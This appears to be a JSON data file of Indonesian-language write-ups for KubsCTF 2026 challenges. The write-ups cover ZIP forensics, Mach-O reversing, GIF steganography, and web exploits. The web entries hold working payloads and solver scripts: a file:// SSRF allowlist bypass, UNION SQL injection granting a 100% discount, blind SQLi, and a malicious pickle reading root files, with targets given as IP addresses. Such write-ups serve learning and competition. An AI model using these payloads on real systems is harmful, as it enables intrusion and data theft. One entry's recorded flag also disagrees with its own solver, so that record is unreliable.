        "code": "#!/usr/bin/env python3\nfrom pathlib import Path\nimport binascii\nimport re\nimport struct\nimport sys\nimport zlib\n\nARCHIVE = Path(sys.argv[1]) if len(sys.argv) > 1 else Path(\"Not to give, not to take.zip\")\nOUTPUT = Path(\"recovered\")\nLOCAL = b\"PK\\x03\\x04\"\nDESCRIPTOR = b\"PK\\x07\\x08\"\n\n\ndef decode_entry(method, compressed):\n    if method == 0:\n        return compressed\n    if method == 8:\n        return zlib.decompress(compressed, -15)\n    raise ValueError(f\"unsupported ZIP method {method}\")\n\n\ndef main():\n    blob = ARCHIVE.read_bytes()\n    OUTPUT.mkdir(exist_ok=True)\n    pos = 0\n    flags = []\n    entry_no = 0\n\n    while pos + 30 <= len(blob) and blob[pos:pos + 4] == LOCAL:\n        (\n            _signature, _version, flag, method, _mtime, _mdate,\n            header_crc, header_csize, header_usize, name_len, extra_len,\n        ) = struct.unpack_from(\"<IHHHHHIIIHH\", blob, pos)\n\n        name_start = pos + 30\n        name_bytes = blob[name_start:name_start + name_len]\n        name = name_bytes.decode(\"cp437\")\n        data_start = name_start + name_len + extra_len\n\n        if flag & 0x0008:\n            next_header = blob.find(LOCAL, data_start)\n            if (next_header < 16 or\n                    blob[next_header - 16:next_header - 12] != DESCRIPTOR):\n                raise ValueError(f\"cannot find descriptor for {name}\")\n            desc_crc, compressed_size, uncompressed_size = struct.unpack_from(\n                \"<III\", blob, next_header - 12\n            )\n            compressed = blob[data_start:next_header - 16]\n            next_pos = next_header\n        else:\n            compressed_size = header_csize\n            uncompressed_size = header_usize\n            desc_crc = header_crc\n            compressed = blob[data_start:data_start + compressed_size]\n            next_pos = data_start + compressed_size\n\n        payload = decode_entry(method, compressed)\n        actual_crc = binascii.crc32(payload) & 0xffffffff\n        crc_ok = actual_crc == desc_crc\n        size_ok = len(payload) == uncompressed_size\n\n        output_path = OUTPUT / name\n        output_path.parent.mkdir(parents=True, exist_ok=True)\n        output_path.write_bytes(payload)\n        print(\n            f\"[{entry_no}] {name!r}: method={method}, \"\n            f\"compressed={len(compressed)}, payload={len(payload)}, \"\n            f\"crc={'OK' if crc_ok else 'BAD'}, \"\n            f\"size={'OK' if size_ok else 'BAD'}\"\n        )\n\n        for match in re.findall(rb\"KubSTU\\{[^}\\r\\n]+\\}\", payload):\n            flags.append(match.decode(\"ascii\"))\n\n        pos = next_pos\n        entry_no += 1\n\n    print(f\"parsed={entry_no}, end_offset={pos}, archive_size={len(blob)}\")\n    if pos != len(blob):\n        print(f\"unparsed_tail={len(blob) - pos} bytes\")\n\n    unique_flags = sorted(set(flags))\n    if len(unique_flags) != 1:\n        raise SystemExit(f\"expected one unique flag, found {unique_flags!r}\")\n    print(f\"FLAG={unique_flags[0]}\")\n\n\nif __name__ == \"__main__\":\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "KubSTU{local_headers_lie_central_directory_does_not}",
    "lessonsLearned": ""
  },
  {
    "id": "kubsctf2026-rev-ouroboros",
    "title": "Ouroboros",
    "category": "Reverse",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-10-13",
    "author": "Nattt",
    "ctfName": "KubsCTF 2026",
    "tags": [
      "rev",
      "kubsuctf",
      "2026"
    ],
    "description": "Binary bernama `chronos` adalah Mach-O universal untuk macOS. Flag final dibuat runtime oleh VM dan decryptor ChaCha-like.",
    "problemDescription": "- `chronos` — Mach-O universal, slice x86_64 dan arm64, stripped.\n- `solve.py` — mereplikasi recovery activation key, hash, dan decryptor payload.\n\n`file chronos` memberikan:",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Ringkasan",
        "content": "Binary bernama `chronos` adalah Mach-O universal untuk macOS. Flag final dibuat runtime oleh VM dan decryptor ChaCha-like.",
        "code": ""
      },
      {
        "title": "File Challenge",
        "content": "- `chronos` — Mach-O universal, slice x86_64 dan arm64, stripped.\n- `solve.py` — mereplikasi recovery activation key, hash, dan decryptor payload.",
        "code": ""
      },
      {
        "title": "Analisis Awal",
        "content": "`file chronos` memberikan:\n\n\n\n`rabin2 -I chronos` menunjukkan slice x86_64 64-bit, PIE, dan binary stripped. Karena binary ditujukan untuk macOS, binary tidak dapat dieksekusi langsung di lingkungan Linux ini.\n\n`strings -a chronos` menemukan string:",
        "code": "Mach-O universal binary with 2 architectures: x86_64, arm64"
      },
      {
        "title": "Analisis Static / dynamic",
        "content": "Dynamic analysis lokal tidak dipakai karena format Mach-O membutuhkan runtime macOS. Static analysis dengan `rabin2` menunjukkan string tersebut berada di:\n\n\n\nJalur flag berada di `func.1000015d1`. Fungsi ini membaca tabel offset 32 record pada `__TEXT.__const` (`0x1000016f0`), mengambil record dari `__DATA`, lalu mendecode setiap byte dengan:\n\n\n\nSection 24 menghasilkan payload decoy:\n\n\n\nSection 25 juga merupakan flag-looking Easter egg. Keduanya bukan flag final.\n\nEntry point slice x86_64 berada pada `0x100000786`. Disassembly juga memperlihatkan beberapa routine tambahan dan data pada section `__DATA.__d7`, `__DATA.__d3`, serta `__DATA.__d5`, sesuai deskripsi Easter eggs.",
        "code": "__TEXT.__cstring, offset relatif slice 0x1690, virtual address 0x100001690"
      },
      {
        "title": "Algoritma Validasi atau Encoding",
        "content": "String Base64 di atas adalah Easter egg/decoy.",
        "code": "base64.b64decode(\n    \"S3ViU1RVe200Y2gwX3MzY3QxMG5zX3QzbGxfc3QwcjEzc30=\"\n)"
      },
      {
        "title": "Penyusunan Solve Script",
        "content": "Bytecode pada `__DATA.__d3` didecrypt dengan LCG. VM melakukan 16 operasi `pop` dan membandingkan hasilnya dengan 16 byte terakhir bytecode. Constraint tersebut menghasilkan activation key:\n\n\n\nBranch tersembunyi kemudian menghitung:\n\n\n\nDigest dipakai sebagai key ChaCha-like 20-round. Ciphertext berada di `__DATA.__d5 + 0x20`, sepanjang 39 byte.\n\n`solve.py` mereplikasi seluruh proses ini dan menghasilkan payload final.\n\nJalankan dengan:\n\n\n\nOutput:",
        "code": "KUBSTU-CHR0N0S26"
      },
      {
        "title": "Solver Script",
        "content": "Solver script lengkap (`solve.py`) untuk mengotomatisasi eksploitasi:",
        "code": "#!/usr/bin/env python3\n\"\"\"Recover the activation key and decrypt the hidden payload.\"\"\"\n\nfrom pathlib import Path\nimport hashlib\nimport struct\n\n\nSLICE = 0x4000\n\n\ndef rol32(x, n):\n    return ((x << n) | (x >> (32 - n))) & 0xFFFFFFFF\n\n\ndef quarter_round(s, a, b, c, d):\n    s[a] = (s[a] + s[b]) & 0xFFFFFFFF\n    s[d] = rol32(s[d] ^ s[a], 16)\n    s[c] = (s[c] + s[d]) & 0xFFFFFFFF\n    s[b] = rol32(s[b] ^ s[c], 12)\n    s[a] = (s[a] + s[b]) & 0xFFFFFFFF\n    s[d] = rol32(s[d] ^ s[a], 8)\n    s[c] = (s[c] + s[d]) & 0xFFFFFFFF\n    s[b] = rol32(s[b] ^ s[c], 7)\n\n\ndef chacha_block(state):\n    working = state[:]\n    for _ in range(10):\n        for q in ((0, 4, 8, 12), (1, 5, 9, 13), (2, 6, 10, 14), (3, 7, 11, 15),\n                  (0, 5, 10, 15), (1, 6, 11, 12), (2, 7, 8, 13), (3, 4, 9, 14)):\n            quarter_round(working, *q)\n    return b\"\".join(struct.pack(\"<I\", (a + b) & 0xFFFFFFFF)\n                     for a, b in zip(working, state))\n\n\ndef main():\n    blob = Path(__file__).with_name(\"chronos\").read_bytes()\n\n    # The VM's 16 pop operations, constrained against the final 16 bytecode\n    # bytes, recover this activation key without guessing.\n    activation_key = b\"KUBSTU-CHR0N0S26\"\n    assert len(activation_key) == 16\n\n    # The hidden branch hashes: activation key || executable-text hash ||\n    # anti-debug status byte (zero in the clean run) || decoded section 15.\n    text = blob[SLICE + 0x6E8:SLICE + 0x6E8 + 0xF7E]\n    text_hash = hashlib.sha256(text).digest()\n    digest_input = activation_key + text_hash + b\"\\0\" + b\"chr0n0s!\"\n    key = hashlib.sha256(digest_input).digest()\n\n    state = list(struct.unpack(\"<4I\", b\"expand 32-byte k\"))\n    state += list(struct.unpack(\"<8I\", key))\n    state += [0]\n    state += list(struct.unpack(\"<2I\", blob[SLICE + 0x3518:SLICE + 0x3520]))\n    state += [struct.unpack(\"<I\", blob[SLICE + 0x3520:SLICE + 0x3524])[0]]\n\n    ciphertext = blob[SLICE + 0x3530:SLICE + 0x3530 + 39]\n    payload = bytes(a ^ b for a, b in zip(ciphertext, chacha_block(state)))\n    flag = payload.decode(\"ascii\")\n    assert flag == \"KubSTU{k3y3d_by_1ts_0wn___t3xt_s3ct10n}\"\n    print(flag)\n\n\nif __name__ == \"__main__\":\n    main()\n"
      }
    ],
    "terminalOutputs": [],
    "flag": "KubSTU{0p3r4t0r_p4yl04d_unl0ck3d}",
    "lessonsLearned": ""
  },
  {
    "id": "kubsctf2026-stegano-colorillusion",
    "title": "[STEGO] Color Illusion",
    "category": "Steganography",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-10-13",
    "author": "Nattt",
    "ctfName": "KubsCTF 2026",
    "tags": [
      "stegano",
      "kubsuctf",
      "2026"
    ],
    "description": "`colors.gif` terlihat seperti pola garis warna biasa. Hint pada metadata menyuruh memeriksa palette index, bukan hanya warna hasil render.\n\n![Palette-index challenge image](/assets/writeups/kubsctf_2026/stegano-colorillusion/colors.gif)",
    "problemDescription": "- `colors.gif` — GIF89a berukuran 220×220.\n\n`exiftool` menemukan comment:",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Ringkasan",
        "content": "`colors.gif` terlihat seperti pola garis warna biasa. Hint pada metadata menyuruh memeriksa palette index, bukan hanya warna hasil render.",
        "code": ""
      },
      {
        "title": "File Challenge",
        "content": "- `colors.gif` — GIF89a berukuran 220×220.",
        "code": ""
      },
      {
        "title": "Analisis Awal",
        "content": "`exiftool` menemukan comment:\n\n\n\nGIF memiliki global color table berisi 256 entri. Gambar memakai palette dasar pada entri 0–127, dengan kanal merah yang sama dengan nomor index. Entri 155–255 adalah warna magenta filler.",
        "code": "Hint: Some colors look the same but aren't. Check palette indices."
      },
      {
        "title": "Temuan Penting",
        "content": "Entri palette 128–154 hampir sama dengan entri pada palette dasar: masing-masing hanya berbeda satu pada kanal merah. Jadi warna tersebut tampak sama, tetapi index yang berpasangan dengannya menyimpan nilai ASCII.\n\nContoh:\n\n\n\nPasangan itu menghasilkan index 75, yaitu karakter `K`. Semua pasangan serupa dibaca berurutan.",
        "code": "palette[128] = (76, 115, 55)\npalette[75]  = (75, 115, 55)"
      },
      {
        "title": "Proses Ekstraksi",
        "content": "1. Baca global color table dari offset setelah header GIF.\n2. Ambil palette awal sampai kanal merah tidak lagi sama dengan index.\n3. Untuk setiap entri berikutnya, cari tepat satu warna dasar yang memiliki jarak RGB Manhattan 1.\n4. Gunakan index warna dasar sebagai ASCII.\n\nHasil decoding:",
        "code": "KubSTU(Pr0bAbly_ea8y_steG0)"
      },
      {
        "title": "Solver Script",
        "content": "Solver script lengkap (`solve.py`) untuk mengotomatisasi eksploitasi:",
        "code": "#!/usr/bin/env python3\n\nfrom pathlib import Path\n\n\nBASE_DIR = Path(__file__).resolve().parent\nGIF_PATH = BASE_DIR / \"colors.gif\"\n\n\ndef read_global_palette(data: bytes) -> list[tuple[int, int, int]]:\n    if data[:6] not in (b\"GIF87a\", b\"GIF89a\"):\n        raise ValueError(\"input bukan file GIF\")\n    if len(data) < 13:\n        raise ValueError(\"header GIF terlalu pendek\")\n\n    packed = data[10]\n    if not packed & 0x80:\n        raise ValueError(\"GIF tidak memiliki global color table\")\n\n    table_size = 2 << (packed & 0x07)\n    end = 13 + 3 * table_size\n    if len(data) < end:\n        raise ValueError(\"global color table terpotong\")\n\n    return [tuple(data[offset : offset + 3]) for offset in range(13, end, 3)]\n\n\ndef decode_palette_message(palette: list[tuple[int, int, int]]) -> str:\n    # Entri awal adalah palette normal: komponen merahnya sama dengan index.\n    base_size = 0\n    for index, color in enumerate(palette):\n        if color[0] != index:\n            break\n        base_size += 1\n\n    if base_size == 0:\n        raise ValueError(\"palette dasar tidak ditemukan\")\n\n    base = palette[:base_size]\n    decoded: list[str] = []\n\n    # Entri pesan hanya berbeda satu nilai RGB dari warna pada palette dasar.\n    for color in palette[base_size:]:\n        candidates = [\n            index\n            for index, original in enumerate(base)\n            if sum(abs(a - b) for a, b in zip(color, original)) == 1\n        ]\n        if len(candidates) != 1:\n            break\n        index = candidates[0]\n        if not 32 <= index <= 126:\n            raise ValueError(f\"index ASCII tidak printable: {index}\")\n        decoded.append(chr(index))\n\n    if not decoded:\n        raise ValueError(\"tidak ada entri palette pesan yang ditemukan\")\n    return \"\".join(decoded)\n\n\ndef main() -> None:\n    if not GIF_PATH.is_file():\n        raise SystemExit(f\"file tidak ditemukan: {GIF_PATH}\")\n\n    palette = read_global_palette(GIF_PATH.read_bytes())\n    flag = decode_palette_message(palette)\n    print(f\"[+] global palette: {len(palette)} entries\")\n    print(f\"[+] pesan dari near-duplicate palette entries: {flag}\")\n    print(f\"<FLAG>{flag}</FLAG>\")\n\n\nif __name__ == \"__main__\":\n    main()\n"
      }
    ],
    "terminalOutputs": [],
    "flag": "KubSTU{Pr0bAbly_ea8y_steG0}",
    "lessonsLearned": ""
  },
  {
    "id": "kubsctf2026-web-kubanrelay",
    "title": "Kuban Relay",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-10-13",
    "author": "Nattt",
    "ctfName": "KubsCTF 2026",
    "tags": [
      "web",
      "kubsuctf",
      "2026"
    ],
    "description": "Flag diambil melalui endpoint link preview yang dapat membaca file lokal memakai scheme `file://`.",
    "problemDescription": "Target: `http://45.153.189.92:5000`.\n\nTidak ada artefak lokal challenge pada awal analisis. File hasil pengerjaan: `solve.py`.",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Ringkasan",
        "content": "Flag diambil melalui endpoint link preview yang dapat membaca file lokal memakai scheme `file://`.",
        "code": ""
      },
      {
        "title": "Target dan File",
        "content": "Target: `http://45.153.189.92:5000`.\n\nTidak ada artefak lokal challenge pada awal analisis. File hasil pengerjaan: `solve.py`.",
        "code": ""
      },
      {
        "title": "Analisis Awal",
        "content": "`/api/docs` mengungkap endpoint:\n\n\n\nPreview hanya memeriksa apakah string `kubmail.local` ada di URL. Vhost aplikasi juga dapat dipilih dengan header `X-Forwarded-Host: kubmail.local`.",
        "code": "/api/preview?url=<URL>"
      },
      {
        "title": "Source Code Review",
        "content": "Source dapat dibaca melalui preview memakai `file:///proc/self/cwd/app.py#kubmail.local`. Source menunjukkan:\n\n\n\nSource juga mengungkap direktori `data/private`.",
        "code": "if 'kubmail.local' not in target:\n    return ..., 403\nwith urlopen(req, timeout=2) as response:"
      },
      {
        "title": "Vulnerability",
        "content": "Allowlist melakukan substring check terhadap URL, bukan validasi scheme atau effective host. Karena itu URL berikut diterima:\n\n\n\nFragment `#kubmail.local` memenuhi substring check tetapi diabaikan oleh `urllib` saat membuka file.",
        "code": "file:///proc/self/cwd/data/private/krd_weather_backup.txt#kubmail.local"
      },
      {
        "title": "Eksploitasi",
        "content": "Request penting:\n\n```http\nGET /api/preview?url=file%3A%2F%2F%2Fproc%2Fself%2Fcwd%2Fdata%2Fprivate%2Fkrd_weather_backup.txt%23kubmail.local HTTP/1.1\nX-Forwarded-Host: kubmail.local\n```\n\nResponse aplikasi berisi isi file private dan flag.",
        "code": ""
      },
      {
        "title": "Catatan Stabilitas",
        "content": "Eksploitasi memakai vhost header dan endpoint preview. Script membaca file target langsung melalui `file://`; tidak memerlukan scanning atau service tambahan.",
        "code": ""
      },
      {
        "title": "Solver Script",
        "content": "Solver script lengkap (`solve.py`) untuk mengotomatisasi eksploitasi:",
        "code": "#!/usr/bin/env python3\n\nimport json\nimport os\nimport re\nimport sys\n\nimport requests\n\n\nTARGET = os.environ.get(\"TARGET\", \"http://45.153.189.92:5000\").rstrip(\"/\")\nFLAG_RE = re.compile(r\"KubSTU\\{[^}]+\\}\")\n\n\ndef main() -> int:\n    # The preview allowlist checks only for this substring. The fragment is\n    # ignored by urllib's file handler, so it does not alter the local path.\n    file_url = \"file:///proc/self/cwd/data/private/krd_weather_backup.txt#kubmail.local\"\n    response = requests.get(\n        f\"{TARGET}/api/preview\",\n        params={\"url\": file_url},\n        headers={\"X-Forwarded-Host\": \"kubmail.local\"},\n        timeout=10,\n    )\n    response.raise_for_status()\n    data = response.json()\n    body = data.get(\"body\", \"\")\n    match = FLAG_RE.search(body)\n    if not match:\n        print(json.dumps(data, ensure_ascii=False), file=sys.stderr)\n        raise RuntimeError(\"flag tidak ditemukan pada response preview\")\n    print(f\"<FLAG>{match.group(0)}</FLAG>\")\n    return 0\n\n\nif __name__ == \"__main__\":\n    raise SystemExit(main())\n"
      }
    ],
    "terminalOutputs": [],
    "flag": "KubSTU{kuban_legacy_gateway_reads_between_the_lines}",
    "lessonsLearned": ""
  },
  {
    "id": "kubsctf2026-web-mercury",
    "title": "Mercury",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-10-13",
    "author": "Nattt",
    "ctfName": "KubsCTF 2026",
    "tags": [
      "web",
      "kubsuctf",
      "2026"
    ],
    "description": "Bug ada di endpoint promo checkout. Nilai `code` diproses sebagai bagian dari query SQL tanpa parameter binding. Dengan `UNION SELECT`, response bisa dipaksa mengembalikan discount 100%. Discount itu disimpan ke session dan dipercaya oleh endpoint pembayaran.",
    "problemDescription": "Target yang dipakai:\n\nDirektori challenge awalnya kosong. File hasil analisis:",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Ringkasan",
        "content": "Bug ada di endpoint promo checkout. Nilai `code` diproses sebagai bagian dari query SQL tanpa parameter binding. Dengan `UNION SELECT`, response bisa dipaksa mengembalikan discount 100%. Discount itu disimpan ke session dan dipercaya oleh endpoint pembayaran.",
        "code": ""
      },
      {
        "title": "Target dan File",
        "content": "Target yang dipakai:\n\n\n\nDirektori challenge awalnya kosong. File hasil analisis:\n\n- `solve.py` — exploit otomatis.\n- `Readme.md` — writeup ini.",
        "code": "http://159.194.250.157:8080/\nhttp://45.153.189.92:8080/\nhttp://155.212.216.201:8080/"
      },
      {
        "title": "Analisis Awal",
        "content": "Homepage menampilkan marketplace dan lot tertutup `13537`, yaitu `Closed access: Mercury Market seller panel` dengan harga `250000 ₽`. User baru mendapat saldo `500 ₽`.\n\nCheckout tidak memakai form HTML biasa. Halaman `/checkout/13537` memuat `mk.js`, lalu melakukan bootstrap, proof-of-work, dan handshake sebelum widget pembayaran dikirim terenkripsi.",
        "code": ""
      },
      {
        "title": "Source Code Review",
        "content": "Tidak ada source code lokal. Dari response checkout dan JavaScript remote, alur API yang dipakai widget adalah:\n\n\n\n`/api/hs` mengeluarkan `mk_sid` dan session baru. Widget terenkripsi dapat didekripsi dengan SHA-256 terhadap key handshake lalu XOR berulang.",
        "code": "GET  /api/bootstrap?c=<mk-c>\nPOST /api/hs\nGET  /api/w/co?e=2&t=1500\nPOST /api/v2/checkout/promo\nPOST /api/v2/checkout/pay"
      },
      {
        "title": "Vulnerability",
        "content": "Endpoint promo menerima `code` dari JSON. Probe awal dengan input SQL menunjukkan query dapat diubah:\n\n```json\n{\"code\":\"' OR '1'='1\"}\njson\n{\"code\":\"' UNION SELECT 'FREE',100,1 -- \"}\njson\n{\"code\":\"FREE\",\"discount\":100.0,\"message\":\"Promo code «FREE» applied. 100% discount.\",\"ok\":true}\n```\n\nServer tidak membatasi discount maksimum dan endpoint pay hanya menghitung harga dari nilai promo di session.",
        "code": "\nResponse mengembalikan promo `WELCOME5`, bukan error. Bentuk UNION tiga kolom kemudian menghasilkan discount arbitrer:\n"
      },
      {
        "title": "Eksploitasi",
        "content": "1. Register akun baru agar mendapat saldo awal 500 ₽.\n2. Buka `/checkout/13537`.\n3. Selesaikan bootstrap, PoW, dan handshake; simpan cookie `session` serta `mk_sid`.\n4. Kirim SQLi promo:\n\n   ```http\n   POST /api/v2/checkout/promo\n   Content-Type: application/json\n\n   {\"code\":\"' UNION SELECT 'FREE',100,1 -- \"}\n   ```\n\n5. Bayar lot dengan `lot` sebagai string:\n\n   ```http\n   POST /api/v2/checkout/pay\n   Content-Type: application/json\n\n   {\"lot\":\"13537\"}\n   ```\n\n6. Response pay memberikan URL order. Halaman order menampilkan goods dari seller dan flag.",
        "code": ""
      },
      {
        "title": "Catatan Stabilitas",
        "content": "- `lot` harus dikirim sebagai string `\"13537\"`; integer menghasilkan response gagal generik.\n- Cookie hasil `/api/hs` dan response promo harus dipertahankan. `requests.Session` di `solve.py` menangani ini.\n- Endpoint promo kadang mengembalikan cooldown singkat; script menunggu lalu mencoba ulang.\n- Flag diambil dari response `/order/<id>`, tepatnya payload goods seller, bukan dari metadata atau komentar HTML.",
        "code": ""
      },
      {
        "title": "Solver Script",
        "content": "Solver script lengkap (`solve.py`) untuk mengotomatisasi eksploitasi:",
        "code": "#!/usr/bin/env python3\n\nimport argparse\nimport base64\nimport hashlib\nimport html\nimport json\nimport os\nimport re\nimport sys\nimport time\n\nimport requests\n\n\nDEFAULT_TARGET = \"http://159.194.250.157:8080\"\nPROMO_SQLI = \"' UNION SELECT 'FREE',100,1 -- \"\nLOT_ID = \"13537\"\nUA = (\n    \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 \"\n    \"(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36\"\n)\n\n\ndef tag_attrs(tag):\n    return dict(re.findall(r\"([:\\w-]+)\\s*=\\s*[\\\"']([^\\\"']*)[\\\"']\", tag))\n\n\ndef page_values(source):\n    html_tag = re.search(r\"<html\\b[^>]*>\", source, re.I)\n    body_tag = re.search(r\"<body\\b[^>]*>\", source, re.I)\n    style = re.search(r\"<style>\\s*:root\\{([^}]*)\\}\\s*</style>\", source, re.I)\n    if not html_tag or not body_tag or not style:\n        raise RuntimeError(\"checkout page is missing DOM challenge values\")\n\n    css = dict(re.findall(r\"--([\\w-]+)\\s*:\\s*(-?\\d+)\", style.group(1)))\n    data = {}\n    for name, value in re.findall(r\"\\b(data-[\\w-]+)\\s*=\\s*[\\\"']([^\\\"']*)[\\\"']\", source, re.I):\n        data.setdefault(name, value)\n    return tag_attrs(html_tag.group(0)), tag_attrs(body_tag.group(0)), css, data\n\n\ndef evaluate_challenge(program, source):\n    \"\"\"Evaluate the small 16-bit arithmetic function returned by /api/bootstrap.\"\"\"\n    html_attrs, body_attrs, css, data = page_values(source)\n    values = {}\n    current = None\n    current_name = None\n\n    def css_value(match):\n        return str(int(css.get(match.group(1), 0)))\n\n    def body_value(match):\n        return str(int(body_attrs.get(match.group(1), 0) or 0))\n\n    def html_value(match):\n        return str(int(html_attrs.get(match.group(1), 0) or 0))\n\n    def query_value(match):\n        return str(int(data.get(match.group(1), 0) or 0))\n\n    for statement in program.split(\";\"):\n        statement = statement.strip()\n        if not statement:\n            continue\n\n        initial = re.fullmatch(r\"(?:var\\s+)?(_\\w+)\\s*=\\s*(-?\\d+)\", statement)\n        if initial:\n            current_name = initial.group(1)\n            current = int(initial.group(2)) & 0xFFFF\n            values[current_name] = current\n            continue\n\n        assignment = re.fullmatch(r\"(_\\w+)\\s*=\\s*(.+)\", statement)\n        if not assignment:\n            continue\n\n        name, expression = assignment.groups()\n        if current is None:\n            raise RuntimeError(\"challenge accumulator was not initialized\")\n\n        expression = re.sub(\n            r\"parseInt\\(_q\\.getPropertyValue\\(['\\\"]--([\\w-]+)['\\\"]\\),10\\)\\s*\\|\\|\\s*0\",\n            css_value,\n            expression,\n        )\n        expression = re.sub(\n            r\"\\+_b\\.getAttribute\\(['\\\"](data-[\\w-]+)['\\\"]\\)\\s*\\|\\|\\s*0\",\n            body_value,\n            expression,\n        )\n        expression = re.sub(\n            r\"\\+_d\\.getAttribute\\(['\\\"](data-[\\w-]+)['\\\"]\\)\\s*\\|\\|\\s*0\",\n            html_value,\n            expression,\n        )\n        expression = re.sub(\n            r\"\\+\\(\\(document\\.querySelector\\(['\\\"]\\[(data-[\\w-]+)\\]['\\\"]\\)\\|\\|_z\\)\\.getAttribute\\(['\\\"]data-[\\w-]+['\\\"]\\)\\)\\s*\\|\\|\\s*0\",\n            query_value,\n            expression,\n        )\n\n        if expression.endswith(\"&65535\"):\n            expression = expression[:-6]\n        expression = expression.replace(\">>>\", \">>\").replace(name, str(current))\n        if not re.fullmatch(r\"[0-9()+\\-*/&|^<> \\t]+\", expression):\n            raise RuntimeError(f\"unsupported bootstrap expression: {expression}\")\n        current = int(eval(expression, {\"__builtins__\": {}}, {})) & 0xFFFF\n        current_name = name\n        values[name] = current\n\n    returned = re.search(r\"return\\s+(_\\w+)\", program)\n    if not returned or returned.group(1) not in values:\n        raise RuntimeError(\"bootstrap function did not return an accumulator\")\n    return values[returned.group(1)]\n\n\ndef flag_from_order(source):\n    payload = re.search(\n        r\"<pre[^>]*class=[\\\"'][^\\\"']*payload[^\\\"']*[\\\"'][^>]*>(.*?)</pre>\",\n        source,\n        re.I | re.S,\n    )\n    if not payload:\n        raise RuntimeError(\"order page has no seller payload\")\n    text = html.unescape(payload.group(1))\n    match = re.search(r\"(?:KubSTU|CTF|FLAG)\\{[^}\\r\\n]+\\}\", text)\n    if not match:\n        raise RuntimeError(\"seller payload contains no flag\")\n    return match.group(0)\n\n\ndef main():\n    parser = argparse.ArgumentParser(description=\"Mercury promo SQLi solver\")\n    parser.add_argument(\n        \"target\",\n        nargs=\"?\",\n        default=os.environ.get(\"TARGET\", DEFAULT_TARGET),\n        help=\"challenge base URL (or use TARGET)\",\n    )\n    args = parser.parse_args()\n    target = args.target.rstrip(\"/\")\n\n    session = requests.Session()\n    session.headers.update({\"User-Agent\": UA, \"Accept\": \"text/html,application/xhtml+xml,application/json;q=0.9,*/*;q=0.8\"})\n\n    username = \"m\" + str(int(time.time() * 1000))[-8:]\n    password = \"M3rcury-Research-2026!\"\n    register = session.post(\n        f\"{target}/register\",\n        data={\"username\": username, \"password\": password},\n        timeout=10,\n        allow_redirects"
      }
    ],
    "terminalOutputs": [],
    "flag": "KubSTU{un10n_s3l3ct_pr0m0_100_p3rc3nt}",
    "lessonsLearned": ""
  },
  {
    "id": "kubsctf2026-web-pawnshop",
    "title": "[Standoff 365] Pawnshop",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-10-13",
    "author": "Nattt",
    "ctfName": "KubsCTF 2026",
    "tags": [
      "web",
      "kubsuctf",
      "2026"
    ],
    "description": "Exploit chain-nya:",
    "problemDescription": "1. Blind SQLi pada `/api/kyc/verify` untuk mengambil kredensial manager.\n2. Login lalu baca `/app/secrets.cfg` untuk mendapatkan API key service internal.\n3. Kirim malicious pickle ke `/api/alerts/process`.\n4. `loan-service` membaca `/root/shadow_records/off_books_ledger.dat` dan mengembalikan isinya di response.\n\n- Target: `http://pawnshop.standalone.stf`\n- Source/config yang dibaca dari target: `app/routes/kyc.py`, `app/routes/auth.py`, `/app/secrets.cfg`\n- Script reproduksi: [solve.py](./solve.py)",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Ringkasan",
        "content": "Exploit chain-nya:\n\n1. Blind SQLi pada `/api/kyc/verify` untuk mengambil kredensial manager.\n2. Login lalu baca `/app/secrets.cfg` untuk mendapatkan API key service internal.\n3. Kirim malicious pickle ke `/api/alerts/process`.\n4. `loan-service` membaca `/root/shadow_records/off_books_ledger.dat` dan mengembalikan isinya di response.",
        "code": ""
      },
      {
        "title": "Target dan File",
        "content": "- Target: `http://pawnshop.standalone.stf`\n- Source/config yang dibaca dari target: `app/routes/kyc.py`, `app/routes/auth.py`, `/app/secrets.cfg`\n- Script reproduksi: [solve.py](./solve.py)",
        "code": ""
      },
      {
        "title": "Analisis Awal",
        "content": "Request normal ke KYC:\n\n```http\nPOST /api/kyc/verify\nContent-Type: application/json\n\n{\"name\":\"Viktor Petrov\"}\njson\n{\"name\":\"Viktor Petrov' AND (1=1) AND '1'='1\"}\n```\n\nMenghasilkan `count: 1`, sedangkan `1=2` menghasilkan `count: 0`.",
        "code": "\nMenghasilkan satu record. Kondisi boolean berikut membedakan response `count`:\n"
      },
      {
        "title": "Source Code Review",
        "content": "Di `kyc.py`:\n\n\n\nFilter hanya memblokir beberapa pola sederhana. Parenthesis membuat payload `AND (1=1)` melewati filter.\n\n`/app/secrets.cfg` membocorkan service internal:",
        "code": "query = f\"SELECT * FROM clients WHERE name = '{req.name}'\""
      },
      {
        "title": "Vulnerability",
        "content": "SQLi blind dipakai untuk membaca baris pertama `public.users` dengan binary search pada panjang dan ASCII tiap karakter. Hasil yang tervalidasi:\n\n- username: `marcus.webb`\n- password: `p4wnM@ster2019`\n\nLogin dengan pasangan tersebut mengembalikan JWT role `manager`.\n\nRoute `/api/alerts/process` menerima body pickle dan melakukan deserialisasi tanpa validasi aman. Route ini diproxy oleh Nginx ke `loan-service`; body kosong menghasilkan response `Deserialization failed: Ran out of input`, sedangkan pickle dictionary benign menghasilkan `status: processed`.",
        "code": ""
      },
      {
        "title": "Eksploitasi",
        "content": "Setelah login, `/app/secrets.cfg` dibaca untuk mendapatkan API key. Payload pickle kemudian memakai `__reduce__` untuk mengembalikan dictionary hasil evaluasi:\n\n\n\nRequest pentingnya:\n\n```http\nPOST /api/alerts/process\nX-API-Key: <key dari /app/secrets.cfg>\nContent-Type: application/x-pickle\ntext\nLedger Reference KubSTU: KubSTU{d33p_r4bb1t_h0l3_hunt3r}\n```",
        "code": "{\n    \"alert_type\": open(\"/root/shadow_records/off_books_ledger.dat\").read(),\n    \"loan_id\": 1,\n    \"message\": \"probe\",\n}"
      },
      {
        "title": "Catatan Stabilitas",
